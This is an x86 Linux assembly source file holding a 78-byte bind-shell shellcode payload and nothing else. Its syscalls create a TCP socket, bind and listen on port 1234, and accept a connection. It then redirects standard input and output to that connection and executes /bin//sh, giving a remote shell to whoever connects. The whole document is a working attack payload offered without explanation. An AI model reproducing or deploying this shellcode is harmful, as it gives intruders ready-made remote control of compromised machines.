.global _start

_start:
# 78 bytes

bndsockcode:
xorl %ebx,%ebx
mull %ebx
pushl %ebx
incl %ebx
pushl %ebx
pushl $0x02
movl %esp,%ecx
movb $0x66,%al
int $0x80

popl %ebx
popl %esi
pushl %edx
pushl $0xd2040002
pushl $0x10
pushl %ecx
pushl %eax
movl %esp,%ecx
pushl $0x66
popl %eax
int $0x80

movl %eax,0x04(%ecx)
movb $0x04,%bl
movb $0x66,%al
int $0x80
incl %ebx
movb $0x66,%al
int $0x80
xchgl %eax,%ebx
popl %ecx
0:
pushl $0x3f
popl %eax
int $0x80
decl %ecx
jns 0b
shellcode:
# xorl %eax,%eax
# pushl %eax
pushl $0x68732f2f
pushl $0x6e69622f
movl %esp,%ebx
pushl %eax
pushl %ebx
movl %esp,%ecx
# cltd
movb $0x0b,%al
int $0x80
